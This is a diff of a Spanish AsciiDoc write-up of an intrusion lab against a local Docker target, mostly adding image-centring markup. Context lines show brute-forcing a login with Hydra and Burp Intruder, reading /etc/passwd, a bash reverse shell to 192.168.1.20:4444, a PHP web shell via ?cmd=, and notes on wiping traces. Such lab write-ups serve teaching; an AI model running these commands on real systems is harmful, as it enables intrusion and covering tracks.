@@ -1,6 +1,5 @@
 = Ira
 :author: Manuel L. Quero
-:revdate: 2025-04-17
 :toc: left
 :doctype: book
 
@@ -79,13 +78,13 @@ $ sudo bash auto_deploy.sh ira.tar
 
 El Intruder de Burpsuite tiene cuatro modos de operar, nosotros utilizaremos dos de ellos, pero me gustaría explicarlos para que quede claro que hace cada uno.
 
-. Sniper -> Este modo prueba una lista de payloads en cada posición de forma individual, manteniendo las demás constantes. Es útil para detectar vulnerabilidades como inyecciones SQL o XSS en parámetros específicos. Por ejemplo, si tienes tres parámetros y una lista de 100 payloads, se realizarán 300 solicitudes (100 por cada parámetro).
+. *Sniper* -> Este modo prueba una lista de payloads en cada posición de forma individual, manteniendo las demás constantes. Es útil para detectar vulnerabilidades como inyecciones SQL o XSS en parámetros específicos. Por ejemplo, si tienes tres parámetros y una lista de 100 payloads, se realizarán 300 solicitudes (100 por cada parámetro).
 
-. Battering Ram -> En este se aplica el mismo payload en todas las posiciones marcadas simultáneamente. Sirve para cuando el mismo valor debe estar presente en múltiples campos, como un token que aparece en varios lugares. Por ejemplo, si marcas dos posiciones y tienes una lista de 50 payloads, se realizarán 50 solicitudes, cada una con el mismo payload en ambas posiciones.​
+. *Battering Ram* -> En este se aplica el mismo payload en todas las posiciones marcadas simultáneamente. Sirve para cuando el mismo valor debe estar presente en múltiples campos, como un token que aparece en varios lugares. Por ejemplo, si marcas dos posiciones y tienes una lista de 50 payloads, se realizarán 50 solicitudes, cada una con el mismo payload en ambas posiciones.​
 
-. Pitchfork -> Este utiliza diferentes listas de payloads para cada posición, insertando los payloads correspondientes en paralelo. Se utiliza cuando se necesita probar combinaciones específicas de valores relacionados, como pares de usuario y contraseña correspondientes. Por ejemplo, si tienes dos listas de 100 elementos cada una, se realizarán 100 solicitudes, combinando el primer elemento de cada lista, luego el segundo, y así sucesivamente.
+. *Pitchfork* -> Este utiliza diferentes listas de payloads para cada posición, insertando los payloads correspondientes en paralelo. Se utiliza cuando se necesita probar combinaciones específicas de valores relacionados, como pares de usuario y contraseña correspondientes. Por ejemplo, si tienes dos listas de 100 elementos cada una, se realizarán 100 solicitudes, combinando el primer elemento de cada lista, luego el segundo, y así sucesivamente.
 
-. Cluster Bomb -> Genera todas las combinaciones posibles entre múltiples listas de payloads, prueba cada combinación en las posiciones correspondientes. Es ideal para ataques de fuerza bruta donde se desconoce la relación entre los valores, como probar todas las combinaciones posibles de usuarios y contraseñas. Por ejemplo, si tienes una lista de 100 usuarios y otra de 100 contraseñas, se realizarán 10,000 solicitudes (100 x 100).
+. *Cluster Bomb* -> Genera todas las combinaciones posibles entre múltiples listas de payloads, prueba cada combinación en las posiciones correspondientes. Es ideal para ataques de fuerza bruta donde se desconoce la relación entre los valores, como probar todas las combinaciones posibles de usuarios y contraseñas. Por ejemplo, si tienes una lista de 100 usuarios y otra de 100 contraseñas, se realizarán 10,000 solicitudes (100 x 100).
 
 ==== 1. Ataque de fuerza bruta estándar
 
@@ -192,10 +191,12 @@ Cómo no conocemos ni el usuario ni la contraseña, tendremos que usar diccionar
 
 Si le damos al F12 podremos inspeccionar la estructura de la página, viendo que en los campos del usuario y contraseña, sus IDs son *user* y *pass*.
 
+[.text-center]
 image::assets/Fuerza Bruta/Diccionario/IDs.png[ID]
 
 Si le damos a Network y enviamos unas credenciales erroneas, veremos que se envían mediante *POST*, además de poder ver la url que será importante para el siguiente comando. Además de conocer el mensaje de error que nos devuelve para poder filtrar, en este caso *"Credenciales incorrectas."*.
 
+[.text-center]
 image::assets/Fuerza Bruta/Diccionario/POST.png[POST]
 
 Nuestro comando en hydra es:
@@ -214,12 +215,15 @@ hydra -L /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt -P 
 ** _los parámetros POST_
 ** _el mensaje que indica un fallo de login_
 
+[.text-center]
 image::assets/Fuerza Bruta/Diccionario/Ataque.png[Ataque]
 
 Probamos las credenciales que ha encontrado.
 
+[.text-center]
 image::assets/Fuerza Bruta/Diccionario/Cred.png[Credenciales]
 
+[.text-center]
 image::assets/Fuerza Bruta/Diccionario/Entrar.png[Pasar login]
 
 De esta forma, podremos acceder mediante el uso de diccionarios, pero en este caso las credenciales eran sencillas, en peores casos tendremos que esperar horas, aunque depende del hardware del ordenador donde se ejecute.
@@ -228,52 +232,65 @@ De esta forma, podremos acceder mediante el uso de diccionarios, pero en este ca
 
 Primeramente recomiendo instalar FoxyProxy en nuestro navegador. Cuando estemos dentro de este, deberemos irnos a Proxies y crear uno nuevo dándole a Add. Deberemos poner la siguiente configuración, para interceptar con Burpsuite en local desde el puerto 8081. Además deberemos añadir en la parte de patrones el que aparece en la siguiente imagen:
 
+[.text-center]
 image::assets/Fuerza Bruta/Diccionario/Burp/FoxyProxy.png[FoxyProxy Config]
 
 Nos vamos a nuestra página donde le daremos al logo de FoxyProxy si lo hemos puesto en la barra de herramientas y le damos al proxy que hemos creado.
 
+[.text-center]
 image::assets/Fuerza Bruta/Diccionario/Burp/FoxyProxy2.png[FoxyProxy Navegador]
 
 Ahora abrimos Burpsuite y creamos un proyecto temporal, ya que tendremos la versión de la comunidad, iniciándolo por defecto. Cuando esté abierto, nos vamos a la configuración del proxy donde pondremos la IP y puerto que hemos configurado en FoxyProxy. 
 
+[.text-center]
 image::assets/Fuerza Bruta/Diccionario/Burp/Burp1.png[Burpsuite]
 
 En Burpsuite, en la parte de Proxy, le damos a *Intercept off* para pasarlo a *on* y comenzar a capturar el tráfico. Y en nuestra página ponemos cualquier credenciales y le damos a entrar, enviándonos a Burpsuite directamente.
 
+[.text-center]
 image::assets/Fuerza Bruta/Diccionario/Burp/Burp2.png[Burpsuite2]
 
+[.text-center]
 image::assets/Fuerza Bruta/Diccionario/Burp/LoginBurp.png[Enviar petición]
 
 En Burpsuite, nos aparecerá la petición POST que hemos capturado, donde podremos ver los IDs de los campos, por lo que para atacar desde Burpsuite, deberemos pasar esta petición al intruder, le damos clic derecho sobre la petición y la enviamo a este:
 
+[.text-center]
 image::assets/Fuerza Bruta/Diccionario/Burp/Burp3.png[Burpsuite2]
 
+[.text-center]
 image::assets/Fuerza Bruta/Diccionario/Burp/Intruder1.png[Intruder1]
 
 Una vez en el Intruder, deberemos darle al desplegable de arriba y cambiarlo a *Cluster bomb attack*, ya que sirve para ataques que combinan usuarios y contraseñas. Después en los IDs que están en la parte inferior, borraremos el usuario y contraseña que hemos puesto antes en el login, y después de cada símbolo de igual le daremos a *Add §*.
 
+[.text-center]
 image::assets/Fuerza Bruta/Diccionario/Burp/Intruder2.png[Intruder2]
 
 A la derecha nos pedirá igresar un payload, es decir, los diccionarios y deberemos poner el correspondiente payload en la posición correcta. En el 1 va el de los usuario y le pongo el diccionario de nombres de usuario frecuentes y en el 2 va la contraseña y por ello le pongo el diccionario de contraseñas sencillas.
 
+[.text-center]
 image::assets/Fuerza Bruta/Diccionario/Burp/Intruder3.png[Intruder3]
 
+[.text-center]
 image::assets/Fuerza Bruta/Diccionario/Burp/Intruder4.png[Intruder4]
 
 Además en la configuración del Intruder deberemos cambiar dos cosas:
 
 * *Redirections* -> Deberemos poner Always para aceptar las redirecciones.
 
+[.text-center]
 image::assets/Fuerza Bruta/Diccionario/Burp/IntruderRedirections.png[Ajuste Redirecciones]
 
 * *Grep - Extract* -> Como hemos hecho antes en el caso de Hydra, deberemos indicarle el mensaje de error. Principalmente se usa para delimitar cuando empieza y cuando acaba el ataque. Por desgracia, no nos aparecerá con nuestra página. Por lo que deberemos estar atentos al cambio de longitud.
 
 Una vez dicho esto le damos al botón naranja para iniciar el ataque, empezará a probar tanto usuarios como contraseñas hasta que dé con el correcto, podemos ver el proceso y cuando cambie la longitud, la primera significa que ha entrado con esas, ya que hemos puesto que acepte redirecciones.
 
+[.text-center]
 image::assets/Fuerza Bruta/Diccionario/Burp/Entrar.png[Pasar el login]
 
 Cuando quitemos la interceptación del proxy, podremos ver cómo hemos entrado:
 
+[.text-center]
 image::assets/Fuerza Bruta/Diccionario/Burp/Entrar2.png[Pasar el login2]
 
 ==== 3. Ataques de fuerza bruta híbrida
@@ -320,34 +337,42 @@ hydra -l admin -P diccionario.txt 172.34.0.2 http-post-form "/index.php:user=^US
 
 * *-l* -> En este parámetro ponemos el nombre del usuario.
 
+[.text-center]
 image::assets/Fuerza Bruta/Hibrido/Hydra/Ataque.png[Ataque]
 
 ===== Burpsuite
 
 En este caso, realizaremos lo ya visto anteriormente hasta la parte del Intruder. En este caso, vamos a usar el Sniper attack, donde se usa en una posicion, un objetivo. Deberemos añadir los símbolos en la parte de la contraseña.
 
+[.text-center]
 image::assets/Fuerza Bruta/Hibrido/Burp/Intruder1.png[Intruder1]
 
 En este caso vamos a poner unas cuantas palabras en la parte de payload, añadiendo una por una, y luego añadiremos a cada una distintos sufijos.
 
+[.text-center]
 image::assets/Fuerza Bruta/Hibrido/Burp/Intruder2.png[Intruder2]
 
 En la parte de Payload processing, añadiremos los sufijos, para ello le daremos a añadir, en la pestaña buscamos "Add sufix" y ponemos el que queramos, además podemos ponerles incluso prefijos para hacerlo más completo. Pero deberemos activarlos según queramos, ya que si todos están activos se acumulan y eso no lo queremos, por lo que voy a ir uno por uno.
 
+[.text-center]
 image::assets/Fuerza Bruta/Hibrido/Burp/Intruder3.png[Intruder3]
 
+[.text-center]
 image::assets/Fuerza Bruta/Hibrido/Burp/Intruder4.png[Intruder4]
 
 Al final nos debe quedar algo así:
 
+[.text-center]
 image::assets/Fuerza Bruta/Hibrido/Burp/Intruder5.png[Intruder5]
 
 También es importante recordar que en la configuración hay que cambiar lo de las redirecciones a siempre. Dicho esto, vamos a probar el ataque:
 
 Si probamos con el primer sufijo, ninguno es correcto, por lo que queda descartado. De esta forma deberemos probarlo con cada uno.
 
+[.text-center]
 image::assets/Fuerza Bruta/Hibrido/Burp/Ataque1.png[Ataque1]
 
+[.text-center]
 image::assets/Fuerza Bruta/Hibrido/Burp/Ataque2.png[Ataque2]
 
 Podemos observar que con el último sufijo que hemos introducido es correcto, ya que a variado la longitud. Y cuando quitemos el proxy ya estermos dentro.
@@ -365,14 +390,17 @@ hydra -L /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt -p 
 
 * *-p* -> En este parámetro ponemos la contraseña que creamos correcta.
 
+[.text-center]
 image::assets/Fuerza Bruta/Inverso/Hydra/Ataque.png[Ataque]
 
 ===== Burpsuite
 
 Como ya hemos visto antes, deberemos hacer lo mismo hasta el punto del Intruder, donde añadiremos los símbolos en el usuario y meteremos un payload para adivinarlo.
 
+[.text-center]
 image::assets/Fuerza Bruta/Inverso/Burp/Intruder.png[Intruder]
 
+[.text-center]
 image::assets/Fuerza Bruta/Inverso/Burp/Ataque.png[Ataque]
 
 Como podemos observar el usuario correcto es *admin*.
@@ -386,6 +414,7 @@ Una vez dentro, gracias a los ataques de fuerza bruta, en el panel de administra
 
 Teniendo a nuestra disposición una terminal, vamos a recolectar información para luego hacer una reverse shell y poder efectuar comando con mayor tranquilidad.
 
+[.text-center]
 image::assets/RCE/CMD/Página.png[Página]
 
 
@@ -393,30 +422,36 @@ image::assets/RCE/CMD/Página.png[Página]
 
 * *ls -la* -> Con este comando podemos ver todos los archivos del directorio actual, conociendo sus permisos, usuario y grupo.
 
+[.text-center]
 image::assets/RCE/CMD/LS.png[comando ls]
 
 * *pwd* -> Podemos saber en qué directorio estamos
 
+[.text-center]
 image::assets/RCE/CMD/PWD.png[comando pwd]
 
 ===== Usuarios
 
 * *whoami* -> Podemos conocer que usuario somos. Podemos ver que somos root, por lo que podemos hacer de todo.
 
+[.text-center]
 image::assets/RCE/CMD/whoami.png[comando whoami]
 
 * *id* -> Podemos ver los permisos que tiene nuestro usuario. 
 
+[.text-center]
 image::assets/RCE/CMD/id.png[comando id]
 
 * *cat /etc/passwd* -> En este archivo se encuentran los usuarios que existen en el sistema
 
+[.text-center]
 image::assets/RCE/CMD/passwd.png[archivo passwd]
 
 ===== Sistema Operativo
 
 * *uname -a* -> Nos dice el sistema operativo en el que se encuentra. Cómo está en un docker dentro de un Kali, podemos ver lo siguiente.
 
+[.text-center]
 image::assets/RCE/CMD/uname.png[comando uname]
 
 ===== Reverse Shell
@@ -425,6 +460,7 @@ Al ser root, podemos hacer todo lo que queramos, cómo si queremos borrar todo e
 
 Abrimos una terminal con netcat y nos ponemos a la escucha:
 
+[.text-center]
 image::assets/RCE/CMD/NetCat1.png[NetCat 1]
 
 En la web ponemos el siguiente comando:
@@ -434,10 +470,12 @@ En la web ponemos el siguiente comando:
 bash -c 'bash -i >& /dev/tcp/192.168.1.20/4444 0>&1'
 ----
 
+[.text-center]
 image::assets/RCE/CMD/NetCat2.png[NetCat 2]
 
 Una vez hecho esto ya estaremos conectados con netcat como root:
 
+[.text-center]
 image::assets/RCE/CMD/NetCat3.png[NetCat 3]
 
 Ya que somos root, y estamos con infltrados en el sistema, he pensado que estaría bien tener en cuenta algunas prácticas para limpiar nuestro rastro:
@@ -525,22 +563,31 @@ Con opciones para borrar registros y desactivar el historial de Bash y autentica
 
 Ahora nos iremos a la parte de subir archivos, donde primeramente provaremos a subir uno de ejemplo:
 
+[.text-center]
 image::assets/RCE/archivos/Página.png[Página]
 
 Voy a subir un archivo pdf para comprobar si se pueden ejecutar los archivos:
 
+[.text-center]
 image::assets/RCE/archivos/PDF1.png[PDF1]
+
+[.text-center]
 image::assets/RCE/archivos/PDF2.png[PDF2]
+
+[.text-center]
 image::assets/RCE/archivos/PDF3.png[PDF3]
 
 Como podemos observar, podemos abrir estos archivos, por lo que vamos a realizar una web shell con permisos de root:
 
+[.text-center]
 image::assets/RCE/archivos/WebShell.png[WebShell]
 
 De esta forma, a través de este archivo podremos ejecutar comandos como administrador, deremos usar lo siguiente en la url del archivo "?cmd=(comando)", así enviamos el comando para que el GET lo obtenga y lo pase.
 
+[.text-center]
 image::assets/RCE/archivos/WebShell2.png[WebShell2]
 
+[.text-center]
 image::assets/RCE/archivos/WebShell3.png[WebShell3]
 
 Y ya podemos hacer lo que queramos como root.
